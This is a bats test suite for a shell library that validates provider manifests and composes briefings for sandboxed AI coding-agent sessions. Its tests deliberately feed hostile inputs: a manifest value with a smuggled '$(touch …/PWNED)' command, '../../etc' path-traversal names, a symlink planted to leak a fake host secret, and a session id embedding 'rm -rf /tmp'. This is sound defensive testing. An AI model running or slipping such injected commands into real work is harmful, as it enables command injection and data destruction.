#!/usr/bin/env bats
# Providers are data, not code. These tests are mostly about what a malformed
# or over-reaching manifest is NOT allowed to do.

setup() {
    REPO_ROOT="$BATS_TEST_DIRNAME/.."
    LIB="$REPO_ROOT/bin/dejima-provider-lib.sh"
    CONFIG_DIR="$(mktemp -d)"
    export DEJIMA_CONFIG_DIR="$CONFIG_DIR"
}
teardown() { rm -rf "$CONFIG_DIR" ${FAKE_ROOT:+"$FAKE_ROOT"}; }

lib() { bash -c 'source "$1"; shift; "$@"' _ "$LIB" "$@"; }

# Checks the CLAIM a remedy message makes rather than pinning its wording:
# every "forge = <name>" it names must be a forge that actually exists. A
# literal like "forge = github" would still pass this after github was
# renamed or removed, silently advising a value that no longer works.
assert_remedy_forges_exist() {
    local text="$1" real name found=0
    real="$(lib provider_list forge)"
    while IFS= read -r name; do
        [ -n "$name" ] || continue
        found=1
        grep -qxF "$name" <<< "$real" || { echo "remedy names nonexistent forge: $name"; return 1; }
    done < <(grep -oE 'forge = [a-z0-9-]+' <<< "$text" | awk '{print $3}')
    [ "$found" -eq 1 ] || { echo "remedy names no forge at all"; return 1; }
}

@test "every shipped manifest validates" {
    for axis in forge workflow harness; do
        while IFS= read -r name; do
            [ -n "$name" ] || continue
            run lib manifest_validate "$axis" "$name"
            [ "$status" -eq 0 ] || { echo "$axis/$name: $output"; return 1; }
        done < <(lib provider_list "$axis")
    done
}

@test "each axis ships at least one provider" {
    for axis in forge workflow harness; do
        [ -n "$(lib provider_list "$axis")" ] || { echo "no $axis providers"; return 1; }
    done
}

@test "an unknown manifest key is fatal" {
    FAKE_ROOT="$(mktemp -d)"
    mkdir -p "$FAKE_ROOT/forges/bogus"
    printf 'capabilities = pr\nnonesuch = 1\n' > "$FAKE_ROOT/forges/bogus/forge.conf"
    run env DEJIMA_PROVIDER_ROOT="$FAKE_ROOT" \
        bash -c 'source "$1"; manifest_validate forge bogus' _ "$LIB"
    [ "$status" -ne 0 ]
    [[ "$output" == *"unknown key"* ]]
}

@test "a manifest is parsed, never sourced" {
    FAKE_ROOT="$(mktemp -d)"
    mkdir -p "$FAKE_ROOT/forges/evil"
    printf 'capabilities = pr\npr_command = $(touch %s/PWNED)\n' "$FAKE_ROOT" \
        > "$FAKE_ROOT/forges/evil/forge.conf"
    run env DEJIMA_PROVIDER_ROOT="$FAKE_ROOT" \
        bash -c 'source "$1"; manifest_validate forge evil' _ "$LIB"
    [ ! -e "$FAKE_ROOT/PWNED" ]
    # And the value is refused outright rather than merely not executed.
    [ "$status" -ne 0 ]
}

# A manifest is parsed once per process and every later read is answered from
# that parse, so these three pin the refusals to the cache rather than to the
# first call: a check that only ran on the way in would leave every read after
# it unguarded, which is the whole risk of caching a trust boundary.

@test "a refused manifest is refused again, not just the first time" {
    FAKE_ROOT="$(mktemp -d)"
    mkdir -p "$FAKE_ROOT/harnesses/halfbad"
    printf 'command = claude\nguards = bad!!name\n' \
        > "$FAKE_ROOT/harnesses/halfbad/harness.conf"
    # Only the verdicts are asserted on: the first call legitimately explains
    # the refusal on stderr, and the second is entitled to stay quiet.
    run env DEJIMA_PROVIDER_ROOT="$FAKE_ROOT" bash -c '
        source "$1" 2>/dev/null
        manifest_validate harness halfbad 2>/dev/null && echo "first accepted"
        manifest_validate harness halfbad 2>/dev/null && echo "second accepted"
        exit 0' _ "$LIB"
    [[ "$output" != *accepted* ]] || { echo "$output"; return 1; }
}

@test "no value of a manifest that fails validation is readable" {
    FAKE_ROOT="$(mktemp -d)"
    mkdir -p "$FAKE_ROOT/harnesses/halfbad"
    # `command` is valid and comes first, so a parser that published values as
    # it went would hand this one out before reaching the line that refuses.
    printf 'command = claude\nguards = bad!!name\n' \
        > "$FAKE_ROOT/harnesses/halfbad/harness.conf"
    run env DEJIMA_PROVIDER_ROOT="$FAKE_ROOT" \
        bash -c 'source "$1"; manifest_get harness halfbad command' _ "$LIB"
    [ "$status" -ne 0 ]
    [[ "$output" != *claude* ]] || { echo "leaked a value: $output"; return 1; }
}

@test "a read is not answered from a manifest under a different provider root" {
    FAKE_ROOT="$(mktemp -d)"
    for root in one two; do
        mkdir -p "$FAKE_ROOT/$root/harnesses/h"
        printf 'command = %s\n' "$root" > "$FAKE_ROOT/$root/harnesses/h/harness.conf"
    done
    run bash -c '
        source "$1"
        DEJIMA_PROVIDER_ROOT="$2/one" manifest_get harness h command
        printf " "
        DEJIMA_PROVIDER_ROOT="$2/two" manifest_get harness h command' _ "$LIB" "$FAKE_ROOT"
    [ "$status" -eq 0 ] || { echo "$output"; return 1; }
    [ "$output" = "one two" ] || { echo "got '$output', wanted 'one two'"; return 1; }
}

@test "provider_dir refuses a name that escapes the axis directory" {
    for bad in ".." "../../etc" "a/b" "" "."; do
        run lib provider_dir forge "$bad"
        [ "$status" -ne 0 ] || { echo "accepted provider name '$bad'"; return 1; }
    done
}

@test "manifest_get returns a value and refuses an unknown key" {
    run lib manifest_get forge gitea pr_command
    [ "$status" -eq 0 ]
    [ -n "$output" ]
    run lib manifest_get forge gitea nonesuch
    [ "$status" -ne 0 ]
}

@test "provider_dir refuses a symlink pointing outside the axis directory" {
    FAKE_ROOT="$(mktemp -d)"
    TARGET="$(mktemp -d)"
    mkdir -p "$FAKE_ROOT/forges" "$TARGET/planted"
    printf 'capabilities = pr\n' > "$TARGET/planted/forge.conf"
    ln -s "$TARGET/planted" "$FAKE_ROOT/forges/evil-link"
    run env DEJIMA_PROVIDER_ROOT="$FAKE_ROOT" \
        bash -c 'source "$1"; provider_dir forge evil-link' _ "$LIB"
    [ "$status" -ne 0 ]
    [[ "$output" == *"forges"* ]]
    rm -rf "$TARGET"
}

@test "provider_dir refuses a dangling symlink" {
    FAKE_ROOT="$(mktemp -d)"
    mkdir -p "$FAKE_ROOT/forges"
    ln -s /nonexistent/target "$FAKE_ROOT/forges/dangling-link"
    run env DEJIMA_PROVIDER_ROOT="$FAKE_ROOT" \
        bash -c 'source "$1"; provider_dir forge dangling-link' _ "$LIB"
    [ "$status" -ne 0 ]
}

@test "a briefing fragment that is a symlink escaping its provider directory is refused" {
    # File-level counterpart to the directory-level checks above:
    # provider_dir contains the *directory*, but the manifest's `briefing`
    # relpath still names a filesystem entry that can itself be a symlink -
    # e.g. a compromised session on the read-write project mount replacing a
    # provider's briefing.md with a symlink to an arbitrary host file (an SSH
    # key, say). Confirmed this leaks without the fix: composing against the
    # unpatched _briefing_provider_fragment printed the planted secret text
    # verbatim, with exit 0.
    FAKE_ROOT="$(mktemp -d)"
    TARGET="$(mktemp -d)"
    mkdir -p "$FAKE_ROOT/forges/f" "$FAKE_ROOT/workflows/w" "$FAKE_ROOT/harnesses/h"
    printf 'capabilities = pr\npr_command = x\n' > "$FAKE_ROOT/forges/f/forge.conf"
    printf 'requires = pr\npush = off\nbriefing = briefing.md\n' > "$FAKE_ROOT/workflows/w/workflow.conf"
    printf 'command = claude\n' > "$FAKE_ROOT/harnesses/h/harness.conf"
    printf 'FAKE-HOST-SECRET-abc123\n' > "$TARGET/secret"
    ln -s "$TARGET/secret" "$FAKE_ROOT/workflows/w/briefing.md"
    run env DEJIMA_PROVIDER_ROOT="$FAKE_ROOT" DEJIMA_CONFIG_DIR="$CONFIG_DIR" \
        bash -c 'source "$1"; briefing_compose f w h' _ "$LIB"
    [ "$status" -ne 0 ]
    [[ "$output" != *"FAKE-HOST-SECRET"* ]]
    rm -rf "$TARGET"
}

@test "a briefing fragment that is a dangling symlink is refused" {
    FAKE_ROOT="$(mktemp -d)"
    mkdir -p "$FAKE_ROOT/forges/f" "$FAKE_ROOT/workflows/w" "$FAKE_ROOT/harnesses/h"
    printf 'capabilities = pr\npr_command = x\n' > "$FAKE_ROOT/forges/f/forge.conf"
    printf 'requires = pr\npush = off\nbriefing = briefing.md\n' > "$FAKE_ROOT/workflows/w/workflow.conf"
    printf 'command = claude\n' > "$FAKE_ROOT/harnesses/h/harness.conf"
    ln -s /nonexistent/target "$FAKE_ROOT/workflows/w/briefing.md"
    run env DEJIMA_PROVIDER_ROOT="$FAKE_ROOT" DEJIMA_CONFIG_DIR="$CONFIG_DIR" \
        bash -c 'source "$1"; briefing_compose f w h' _ "$LIB"
    [ "$status" -ne 0 ]
}

@test "gitea's manifest names the CLIs it actually ships" {
    while IFS= read -r rel; do
        [ -n "$rel" ] || continue
        [ -f "$REPO_ROOT/forges/gitea/$rel" ] \
            || { echo "install names a missing file: $rel"; return 1; }
        [ -x "$REPO_ROOT/forges/gitea/$rel" ] \
            || { echo "install names a non-executable file: $rel"; return 1; }
    done < <(lib manifest_get forge gitea install | tr ' ' '\n')
}

@test "a forge's pr_command resolves to something the image will have" {
    # Either a file the forge ships, or a binary the Dockerfile installs.
    for f in $(lib provider_list forge); do
        cmd="$(lib manifest_get forge "$f" pr_command)"
        [ -n "$cmd" ] || continue
        word0="${cmd%% *}"
        if [ -f "$REPO_ROOT/forges/$f/bin/$word0" ]; then continue; fi
        grep -q "$word0" "$REPO_ROOT/docker/Dockerfile" \
            || { echo "$f: pr_command '$cmd' is neither shipped nor installed"; return 1; }
    done
}

@test "the Dockerfile copies every forge's bin, not one forge by name" {
    grep -q 'COPY forges/' "$REPO_ROOT/docker/Dockerfile"
    run grep -n 'COPY bin/gitea' "$REPO_ROOT/docker/Dockerfile"
    [ "$status" -ne 0 ]
}

@test "gitea's CLIs moved out of bin/ and into its forge" {
    [ ! -e "$REPO_ROOT/bin/gitea-pr" ]
    [ ! -e "$REPO_ROOT/bin/gitea-issue" ]
    [ -x "$REPO_ROOT/forges/gitea/bin/gitea-pr" ]
    [ -x "$REPO_ROOT/forges/gitea/bin/gitea-issue" ]
}

@test "a workflow requiring a capability its forge lacks is refused" {
    FAKE_ROOT="$(mktemp -d)"
    mkdir -p "$FAKE_ROOT/forges/bare" "$FAKE_ROOT/workflows/needy" "$FAKE_ROOT/harnesses/h"
    printf 'capabilities =\n' > "$FAKE_ROOT/forges/bare/forge.conf"
    printf 'requires = pr\npush = off\n' > "$FAKE_ROOT/workflows/needy/workflow.conf"
    printf 'command = claude\n' > "$FAKE_ROOT/harnesses/h/harness.conf"
    run env DEJIMA_PROVIDER_ROOT="$FAKE_ROOT" \
        bash -c 'source "$1"; provider_validate_selection bare needy h' _ "$LIB"
    [ "$status" -ne 0 ]
    [[ "$output" == *"pr"* ]]
    [[ "$output" == *"bare"* ]]
    [[ "$output" == *"needy"* ]]
}

@test "a pushing workflow on a forge with no hosts is refused" {
    # gitea's ssh_host/api have no schema default and install.sh writes them
    # commented out, so this is what an operator who selects a pushing
    # workflow without configuring the forge hits - `forge = none` (the
    # shipped default) is the honest way to say "no forge" instead.
    FAKE_ROOT="$(mktemp -d)"
    mkdir -p "$FAKE_ROOT/forges/hostless" "$FAKE_ROOT/workflows/pusher" "$FAKE_ROOT/harnesses/h"
    # keys is non-empty - this forge IS configurable, just not configured -
    # unlike `none`, which has no keys at all and gets its own message below.
    printf 'capabilities =\nkeys = ssh_host:?hostname\n' > "$FAKE_ROOT/forges/hostless/forge.conf"
    printf 'requires =\npush = on\n' > "$FAKE_ROOT/workflows/pusher/workflow.conf"
    printf 'command = claude\n' > "$FAKE_ROOT/harnesses/h/harness.conf"
    run env DEJIMA_PROVIDER_ROOT="$FAKE_ROOT" \
        bash -c 'source "$1"; provider_validate_selection hostless pusher h' _ "$LIB"
    [ "$status" -ne 0 ]
    [[ "$output" == *"forge = none"* ]]
}

@test "a pushing workflow against a forge with no host is refused, and names none" {
    # gitea with nothing configured resolves to no host at all.
    printf '[core]\nfirewall = on\n' > "$CONFIG_DIR/config"
    run lib provider_validate_selection gitea worktree-pr claude-code
    [ "$status" -ne 0 ]
    [[ "$output" == *"forge = none"* ]]
}

@test "a partly configured forge is refused, not merely warned about" {
    # token_file is not named here (and would not need to be, to make this
    # partial): its schema default (~/.config/gitea/token) means it can
    # never be genuinely missing, so it never enters set_n/unset_n at all -
    # see "the shipped selection validates with the documented setup" below.
    printf '[forge.gitea]\nssh_host = git.example\n' > "$CONFIG_DIR/config"
    run lib provider_validate_selection gitea worktree-pr claude-code
    [ "$status" -ne 0 ]
    [[ "$output" == *"api"* ]]
}

@test "the shipped defaults are a non-pushing pair that validates with no forge configured" {
    # A fresh install must launch. The defaults were gitea + worktree-pr,
    # which is a PUSHING pair, and rule 3 refuses a pushing workflow whose
    # forge resolves to no host - so an unedited config was refused at every
    # launch until a forge was configured. Driven off the schema rather than
    # the literal names, so a future default that reintroduces the
    # contradiction fails here, next to the rule it contradicts, instead of
    # in twenty-odd launcher tests that never mention forges.
    printf '[core]\nfirewall = on\n' > "$CONFIG_DIR/config"
    local forge workflow harness
    forge="$(lib config_default core.forge)"
    workflow="$(lib config_default core.workflow)"
    # No default to read: the shipped pair under test is forge/workflow.
    harness=claude-code
    [ "$(lib manifest_get workflow "$workflow" push)" = "off" ] \
        || { echo "default workflow '$workflow' pushes - a fresh install has no forge to push to"; return 1; }
    run lib provider_validate_selection "$forge" "$workflow" "$harness"
    [ "$status" -eq 0 ] || { echo "the shipped defaults do not validate unconfigured: $output"; return 1; }
}

@test "a non-pushing workflow against an unconfigured forge is still fine" {
    # local-only pushes nothing, so having no host is not a contradiction.
    printf '[core]\nfirewall = on\n' > "$CONFIG_DIR/config"
    run lib provider_validate_selection none local-only claude-code
    [ "$status" -eq 0 ] || { echo "$output"; return 1; }
}

@test "the shipped selection validates with the documented setup" {
    # This is the regression guard for the README/install.sh setup: an
    # operator is told to set only ssh_host and api and save the token at
    # token_file's schema default path (~/.config/gitea/token), leaving
    # token_file itself unset in the config. A key with a non-empty schema
    # default can never be genuinely missing - its resolved value is already
    # correct - so it must not make this look partly configured and refused.
    printf '[forge.gitea]\nssh_host = git.example\napi = https://api.example/v1\n' \
        > "$CONFIG_DIR/config"
    run lib provider_validate_selection gitea worktree-pr claude-code
    [ "$status" -eq 0 ] || { echo "$output"; return 1; }
}

@test "a wholly unconfigured forge still validates against a non-pushing workflow" {
    # The supported "I don't use a forge" case is now scoped to a workflow
    # that doesn't push (local-only) - a pushing one is rule 3's refusal
    # above. Rules 3 and 5 (and the single-required-key check) are all
    # gated on push = on, so local-only never reaches any of them regardless
    # of what is or isn't configured.
    printf '[core]\nfirewall = on\n' > "$CONFIG_DIR/config"
    run lib provider_validate_selection gitea local-only claude-code
    [ "$status" -eq 0 ] || { echo "$output"; return 1; }
}

@test "a partially configured forge still validates against a non-pushing workflow" {
    # Rule 5 is gated on push = on: local-only never invokes the forge, so
    # setting only ssh_host (e.g. so the firewall allows fetches) is a
    # legitimate configuration, not a typo to refuse.
    printf '[forge.gitea]\nssh_host = git.example\n' > "$CONFIG_DIR/config"
    run lib provider_validate_selection gitea local-only claude-code
    [ "$status" -eq 0 ] || { echo "$output"; return 1; }
}

@test "a pushing workflow against forge = none names the workflow, not [forge.none]" {
    # none has no keys at all, so "Configure [forge.none]" would be a fix
    # that does not exist - the only honest remedy is the workflow.
    printf '[core]\nfirewall = on\n' > "$CONFIG_DIR/config"
    run lib provider_validate_selection none branch-push claude-code
    [ "$status" -ne 0 ]
    [[ "$output" == *"nothing to configure"* ]]
    [[ "$output" == *"workflow = local-only"* ]]
    [[ "$output" != *"[forge.none]"* ]]
}

@test "a pushing workflow against a single-required-key forge with nothing set is refused" {
    # github's fixed_hosts (github.com et al) are pinned independent of
    # config, so forge_hosts is never empty and rule 3 alone would let a
    # wholly unconfigured github sail through. github's `requires` is also
    # exactly one key, so it can never be "partly" configured (rule 5's own
    # condition) - it is either wholly set or wholly unset. This is the gap
    # between the two rules that only a dedicated check closes.
    printf '[core]\nfirewall = on\nforge = github\nworkflow = branch-push\n' > "$CONFIG_DIR/config"
    run lib provider_validate_selection github branch-push claude-code
    [ "$status" -ne 0 ]
    [[ "$output" == *"push_token_file"* ]]
}

@test "forge_hosts unions literal host keys, URL-derived hosts and fixed hosts" {
    printf '[forge.gitea]\nssh_host = git.example\napi = https://api.example/v1\n' \
        > "$CONFIG_DIR/config"
    run lib forge_hosts gitea
    [ "$status" -eq 0 ]
    [[ "$output" == *"git.example"* ]]
    [[ "$output" == *"api.example"* ]]
    # The scheme and path never survive into a firewall entry.
    [[ "$output" != *"https"* ]]
    [[ "$output" != *"/v1"* ]]
}

@test "a token file containing an embedded newline makes forge_env_exports fail" {
    printf '[forge.gitea]\ntoken_file = %s/token\n' "$CONFIG_DIR" > "$CONFIG_DIR/config"
    printf 'line1\nline2\n' > "$CONFIG_DIR/token"
    run lib forge_env_exports gitea
    [ "$status" -ne 0 ]
    [[ "$output" == *"newline"* ]]
    # The secret must never appear in the error message.
    [[ "$output" != *"line1"* ]]
    [[ "$output" != *"line2"* ]]
}

@test "a single-line token file with trailing newline works and yields one record" {
    printf '[forge.gitea]\ntoken_file = %s/token\n' "$CONFIG_DIR" > "$CONFIG_DIR/config"
    printf 'my-secret-token\n' > "$CONFIG_DIR/token"
    run lib forge_env_exports gitea
    [ "$status" -eq 0 ]
    # $(<file) strips trailing newlines, so the GITEA_TOKEN line should have no
    # embedded newline - the output includes the api and ssh_host lines too, and
    # the test is specifically about the token line surviving a trailing newline.
    # grep for just the line with content and verify it has no embedded newlines.
    token_line="$(printf '%s\n' "$output" | grep '^GITEA_TOKEN=')"
    [ "$token_line" = "GITEA_TOKEN=my-secret-token" ]
}

@test "an '&' in a substituted value survives composition literally" {
    # Regression check: bash 5.2's patsub_replacement (on by default) makes a
    # literal "&" in a ${var//pat/rep} replacement expand to the matched
    # text - here the {{writable_mounts}} token itself - which leaves the
    # marker in place instead of substituting it. [mounts] read_write's own
    # `path` type explicitly permits "&", so a value like /tmp/x/R&D made
    # bin/dejima refuse to launch with "an unresolved placeholder remains
    # after briefing composition" - confirmed directly against the unpatched
    # _briefing_substitute before this fix, which fails closed only by luck
    # of the marker containing braces.
    printf '[forge.gitea]\nssh_host = git.example\napi = https://api.example/v1\ntoken_file = /dev/null\n' \
        > "$CONFIG_DIR/config"
    run env DEJIMA_RW_MOUNTS='/tmp/x/R&D' bash -c \
        'source "$1"; briefing_compose gitea worktree-pr claude-code' _ "$LIB"
    [ "$status" -eq 0 ] || { echo "$output"; return 1; }
    [[ "$output" == *'/tmp/x/R&D'* ]]
    [[ "$output" != *"{{"* ]]
    [[ "$output" != *"}}"* ]]
}

@test "composition substitutes the whitelist and defers the two runtime keys" {
    printf '[forge.gitea]\nssh_host = git.example\napi = https://api.example/v1\ntoken_file = /dev/null\n' \
        > "$CONFIG_DIR/config"
    run lib briefing_compose gitea worktree-pr claude-code
    [ "$status" -eq 0 ] || { echo "$output"; return 1; }
    [[ "$output" == *"gitea-pr create"* ]]
    [[ "$output" == *"git.example"* ]]
    [[ "$output" == *"@@SESSION_ID@@"* ]]
    [[ "$output" == *"@@CONTAINER_ID@@"* ]]
    # No placeholder survives composition in either spelling.
    [[ "$output" != *"{{"* ]]
    [[ "$output" != *"}}"* ]]
}

@test "an unknown placeholder is refused rather than emitted literally" {
    FAKE_ROOT="$(mktemp -d)"
    mkdir -p "$FAKE_ROOT/forges/f" "$FAKE_ROOT/workflows/w" "$FAKE_ROOT/harnesses/h"
    printf 'capabilities = pr\npr_command = x\n' > "$FAKE_ROOT/forges/f/forge.conf"
    printf 'requires = pr\npush = off\nbriefing = briefing.md\n' > "$FAKE_ROOT/workflows/w/workflow.conf"
    printf 'command = claude\n' > "$FAKE_ROOT/harnesses/h/harness.conf"
    printf 'Run {{nonesuch}} to proceed.\n' > "$FAKE_ROOT/workflows/w/briefing.md"
    run env DEJIMA_PROVIDER_ROOT="$FAKE_ROOT" DEJIMA_CONFIG_DIR="$CONFIG_DIR" \
        bash -c 'source "$1"; briefing_compose f w h' _ "$LIB"
    [ "$status" -ne 0 ]
    [[ "$output" == *"nonesuch"* ]]
}

@test "the core fragment is present and is not provider-supplied" {
    run lib briefing_compose gitea worktree-pr claude-code
    [ "$status" -eq 0 ]
    # The containment reasoning a provider must not be able to remove.
    [[ "$output" == *"allowlist"* ]]
    [[ "$output" == *"Stay within the task"* ]]
    # And it is not reachable as a file any provider ships.
    run bash -c 'ls "$1"/workflows/*/core* "$1"/forges/*/core* 2>/dev/null' _ "$REPO_ROOT"
    [ -z "$output" ]
}

@test "a provider briefing fragment is capped" {
    FAKE_ROOT="$(mktemp -d)"
    mkdir -p "$FAKE_ROOT/forges/f" "$FAKE_ROOT/workflows/w" "$FAKE_ROOT/harnesses/h"
    printf 'capabilities = pr\npr_command = x\n' > "$FAKE_ROOT/forges/f/forge.conf"
    printf 'requires = pr\npush = off\nbriefing = briefing.md\n' > "$FAKE_ROOT/workflows/w/workflow.conf"
    printf 'command = claude\n' > "$FAKE_ROOT/harnesses/h/harness.conf"
    head -c 40000 /dev/zero | tr '\0' 'x' > "$FAKE_ROOT/workflows/w/briefing.md"
    run env DEJIMA_PROVIDER_ROOT="$FAKE_ROOT" DEJIMA_CONFIG_DIR="$CONFIG_DIR" \
        bash -c 'source "$1"; briefing_compose f w h' _ "$LIB"
    [ "${#output}" -lt 40000 ]
}

@test "every placeholder in every shipped fragment is in the whitelist" {
    found=0
    while IFS= read -r f; do
        [ -n "$f" ] || continue
        while IFS= read -r ph; do
            [ -n "$ph" ] || continue
            found=1
            case "$ph" in
                pr_command|issue_command|forge_name|forge_ssh_host|blocked_branches) ;;
                container_id|project_dir|workspace_dir|session_id) ;;
                resume_command|writable_mounts) ;;
                *) echo "$f uses unknown placeholder: $ph"; return 1 ;;
            esac
        done < <(grep -oE '\{\{[a-z_]+\}\}' "$f" | tr -d '{}')
    done < <(find "$REPO_ROOT/workflows" "$REPO_ROOT/harnesses" "$REPO_ROOT/forges" -name '*.md' -o -name '*.conf')
    # Guards against a grep that silently matches nothing.
    [ "$found" = 1 ]
}

@test "the hook substitutes only the two runtime placeholders" {
    b="$(mktemp)"
    printf 'session=@@SESSION_ID@@ container=@@CONTAINER_ID@@\n' > "$b"
    run env DEJIMA=1 DEJIMA_BRIEFING_FILE="$b" bash -c \
        'printf "{\"session_id\":\"abc123\",\"cwd\":\"$PWD\"}" | bash "$1"' _ \
        "$REPO_ROOT/hooks/sandbox-context.sh"
    [ "$status" -eq 0 ]
    ctx="$(printf '%s' "$output" | jq -r '.hookSpecificOutput.additionalContext')"
    [[ "$ctx" == *"session=abc123"* ]]
    [[ "$ctx" != *"@@SESSION_ID@@"* ]]
    [[ "$ctx" != *"@@CONTAINER_ID@@"* ]]
    rm -f "$b"
}

@test "the hook handles session ids with & / and \\ without mangling them" {
    # Regression check: bash 5.2's patsub_replacement (on by default) makes "&"
    # in parameter expansion replacements expand to the matched text. A session
    # id from the harness payload (untrusted) containing "&" would defeat the
    # substitution, leaving the marker and corrupting the --resume line. The fix
    # uses prefix/suffix removal instead, which never interprets the value.
    # Covering all three special cases (& / \) ensures a future rewrite that
    # switches to sed or another mechanism doesn't regress on any of them.
    b="$(mktemp)"
    printf 'resume-cmd: dejima --resume @@SESSION_ID@@\ncontainer=@@CONTAINER_ID@@\n' > "$b"
    # Session id crafted to test each special case in the replacement context.
    # Use printf %s so the value is never interpreted by the shell.
    run env DEJIMA=1 DEJIMA_BRIEFING_FILE="$b" bash -c \
        'printf "{\"session_id\":%s,\"cwd\":\"%s\"}" "$(printf "%s" "$1" | jq -Rs .)" "$PWD" | bash "$2"' _ \
        'pr-42&rm -rf /tmp\test/path' "$REPO_ROOT/hooks/sandbox-context.sh"
    [ "$status" -eq 0 ]
    ctx="$(printf '%s' "$output" | jq -r '.hookSpecificOutput.additionalContext')"
    # The session id must appear verbatim
    [[ "$ctx" == *"pr-42&rm -rf /tmp"* ]] || { echo "session id & not found"; return 1; }
    [[ "$ctx" == *"test/path"* ]] || { echo "session id path not found"; return 1; }
    # No marker may remain
    [[ "$ctx" != *"@@SESSION_ID@@"* ]] || { echo "@@SESSION_ID@@ marker remained"; return 1; }
    [[ "$ctx" != *"@@CONTAINER_ID@@"* ]] || { echo "@@CONTAINER_ID@@ marker remained"; return 1; }
    rm -f "$b"
}

@test "a missing briefing file degrades rather than failing the session" {
    run env DEJIMA=1 DEJIMA_BRIEFING_FILE=/nonexistent/briefing bash -c \
        'printf "{\"session_id\":\"x\",\"cwd\":\"$PWD\"}" | bash "$1"' _ \
        "$REPO_ROOT/hooks/sandbox-context.sh"
    [ "$status" -eq 0 ]
    printf '%s' "$output" | jq -e '.hookSpecificOutput.additionalContext' >/dev/null
}

@test "the hook no longer carries the briefing text itself" {
    # The prose lives in the core fragment and the provider fragments now; a
    # copy left behind here would drift silently.
    run grep -c 'gitea-pr create' "$REPO_ROOT/hooks/sandbox-context.sh"
    [ "$output" = "0" ]
    run grep -ci 'gitea' "$REPO_ROOT/hooks/sandbox-context.sh"
    [ "$output" = "0" ]
}

@test "the none forge declares no capabilities, keys or hosts" {
    run lib manifest_validate forge none
    [ "$status" -eq 0 ] || { echo "$output"; return 1; }
    [ -z "$(lib manifest_get forge none capabilities)" ]
    [ -z "$(lib manifest_get forge none keys)" ]
    [ -z "$(lib manifest_get forge none requires)" ]
    # No host sources at all - this is what makes it the honest "I have no
    # forge" answer rather than a forge that merely isn't configured yet.
    [ -z "$(lib forge_hosts none)" ]
    [ -z "$(lib forge_env_exports none)" ]
}

@test "the none forge ships no CLIs into the image" {
    [ -z "$(lib manifest_get forge none install)" ]
    [ ! -d "$REPO_ROOT/forges/none/bin" ]
}

@test "a workflow needing a capability is refused against the none forge" {
    run lib provider_validate_selection none worktree-pr claude-code
    [ "$status" -ne 0 ]
    [[ "$output" == *"requires the 'pr' capability"* ]]
}

@test "docs/providers.md documents every manifest key" {
    for axis in forge workflow harness; do
        while IFS=$'\t' read -r key _rest; do
            [ -n "$key" ] || continue
            grep -q "\`$key\`" "$REPO_ROOT/docs/providers.md" \
                || { echo "$axis key '$key' is undocumented"; return 1; }
        done < <(bash -c 'source "$1"; _manifest_table "$2"' _ "$LIB" "$axis")
    done
}

@test "docs/providers.md documents every shipped provider" {
    local doc="$REPO_ROOT/docs/providers.md" axis name
    for axis in forge workflow harness; do
        while IFS= read -r name; do
            [ -n "$name" ] || continue
            grep -q "$name" "$doc" || { echo "docs/providers.md never mentions $axis '$name'"; return 1; }
        done < <(lib provider_list "$axis")
    done
}

@test "no doc still says the new providers are unbuilt" {
    ! grep -qi 'not yet built\|Phase 3 candidates\|deferred to Phase 3' "$REPO_ROOT/docs/providers.md"
}

@test "the github forge's firewall posture change is documented" {
    grep -q 'ssh.github.com' "$REPO_ROOT/docs/providers.md"
    grep -qi 'push' "$REPO_ROOT/docs/providers.md"
}

@test "no doc still points at the old gitea CLI paths" {
    run grep -rn 'bin/gitea-pr\|bin/gitea-issue' "$REPO_ROOT/README.md" \
        "$REPO_ROOT/docs" "$REPO_ROOT/install.sh"
    [ "$status" -ne 0 ] || { echo "$output"; return 1; }
}

@test "the briefing names a real forge host, and says nothing about one for none" {
    printf '[forge.gitea]\nssh_host = git.example\n' > "$CONFIG_DIR/config"
    run lib briefing_compose gitea worktree-pr claude-code
    [ "$status" -eq 0 ] || { echo "$output"; return 1; }
    [[ "$output" == *"GitHub read-only, the configured gitea host (git.example), plus anything"* ]]

    # workflows/local-only (Task 4) is what `forge = none` is meant to pair
    # with - none's capabilities are empty, and local-only requires none, so
    # this composes the real shipped trio rather than a throwaway workflow.
    run lib briefing_compose none local-only claude-code
    [ "$status" -eq 0 ] || { echo "$output"; return 1; }
    # No dangling article, no "none" read as a forge name.
    [[ "$output" == *"GitHub read-only, plus anything"* ]]
    [[ "$output" != *"configured none host"* ]]
}

@test "branch-push pushes and blocks main, but attempts no PR" {
    run lib manifest_validate workflow branch-push
    [ "$status" -eq 0 ] || { echo "$output"; return 1; }
    [ "$(lib manifest_get workflow branch-push push)" = "on" ]
    [ "$(lib manifest_get workflow branch-push blocked_branches)" = "main master" ]
    [ "$(lib manifest_get workflow branch-push block_merge)" = "off" ]
    [ "$(lib manifest_get workflow branch-push requires_worktree)" = "on" ]
    [ "$(lib manifest_get workflow branch-push autonomy)" = "push-branch" ]
    # Requires no capability, so it is usable against a forge that offers
    # none - but it still pushes, so unlike a non-pushing workflow it cannot
    # pair with forge = none itself (rule 3: a pushing workflow needs a forge
    # that resolves to a host, and none never does). Exercised here against
    # gitea, fully configured, for a host without exercising any capability.
    printf '[forge.gitea]\nssh_host = git.example\napi = https://api.example/v1\ntoken_file = /dev/null\n' \
        > "$CONFIG_DIR/config"
    run lib provider_validate_selection gitea branch-push claude-code
    [ "$status" -eq 0 ] || { echo "$output"; return 1; }
}

@test "the branch-push briefing tells the agent to stop at the push" {
    run lib briefing_compose gitea branch-push claude-code
    [ "$status" -eq 0 ] || { echo "$output"; return 1; }
    [[ "$output" == *"Push that branch"* ]]
    # It must not instruct opening a PR - that is worktree-pr's job, and this
    # workflow's whole point is that it stops earlier.
    [[ "$output" != *"create"*"PR"* ]] || { echo "branch-push briefing mentions opening a PR"; return 1; }
}

# #32: an implementer ran a bare `git config user.name ...` inside a
# worktree and wrote the parent checkout's real config, misattributing three
# commits. A worktree isolates the working tree, not `.git/config`, and the
# briefing told the agent to use worktrees while saying nothing about that -
# which reads as more isolation than is on offer. The same unscoped command
# reaches core.hooksPath and credential.helper, which execute on the host.
#
# In the core paragraph rather than a workflow's own prose, so a workflow can
# opt into worktrees but cannot ship them without this.
@test "every worktree briefing says a worktree does not isolate .git/config" {
    local wf
    for wf in worktree-pr branch-push; do
        [ "$(lib manifest_get workflow "$wf" requires_worktree)" = "on" ]
        run lib briefing_compose gitea "$wf" claude-code
        [ "$status" -eq 0 ] || { echo "$output"; return 1; }
        [[ "$output" == *".git/config"* ]] \
            || { echo "$wf briefing does not mention .git/config"; return 1; }
        [[ "$output" == *"git -C"* ]] \
            || { echo "$wf briefing does not give the scoped form"; return 1; }
    done
}

